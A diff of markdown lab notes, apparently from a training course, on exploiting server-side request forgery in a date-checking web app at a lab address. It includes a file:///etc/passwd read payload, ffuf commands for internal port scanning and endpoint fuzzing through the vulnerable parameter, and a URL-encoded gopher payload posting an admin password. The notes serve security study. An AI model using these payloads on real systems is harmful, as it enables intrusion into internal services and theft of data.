@@ -15,24 +15,50 @@ Based on web app at http://10.129.201.127:34978 that has a drop down to check da
 
 ### Exploitation
 
-- Change POST parameter to `dateserver=file:///etc/passwd&date=2024-01-01` to check for LFI.
+#### LFI
 
-- internal portscan by accessing ports on localhost:
+Change POST parameter to `dateserver=file:///etc/passwd&date=2024-01-01`.
+
+#### Port Scan
+
+Internal portscan by accessing ports on localhost:
 
 ```bash
 seq 1 10000 > ports.txt
 ffuf -w ./ports.txt -u http://10.129.201.127/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" -fr "Failed to connect to"
 ```
 
-- accessing restricted endpoints:
+#### Fuzzing Endpoints
+
+Accessing restricted endpoints:
 
 ```bash
 ffuf -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -u http://10.129.201.127/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://dateserver.htb/FUZZ.php&date=2024-01-01" -fr "Server at dateserver.htb Port 80"
 ```
 
-- Consider we find and endpoint admin.php through fuzzing which returns a POST form:
+#### Using Gopher
+
+Consider we find an endpoint admin.php through fuzzing which returns a POST form:
 
 ![admin.php](../images/admin_php.png)
+
+To send a POST request to /admin.php containing the password in the adminpw POST parameter we can use gopher: `dateserver=gopher%3a//dateserver.htb%3a80/_POST%2520/admin.php%2520HTTP%252F1.1%250D%250AHost%3a%2520dateserver.htb%250D%250AContent-Length%3a%252013%250D%250AContent-Type%3a%2520application/x-www-form-urlencoded%250D%250A%250D%250Aadminpw%253Dadmin&date=2024-01-01`
+
+Gopher crafted a post request within the `dataserver` post parameter.
+
+Gopher can craft URLs that access other internal services through post parameters:
+- MySQL
+- PostgreSQL
+- FastCGI
+- Redis
+- SMTP
+- Zabbix
+- pymemcache
+- rbmemcache
+- phpmemcache
+- dmpmemcache
+
+We can use [Gopherus](https://github.com/tarunkant/Gopherus) to craft these payloads for us.
 
 ### Protocols
 
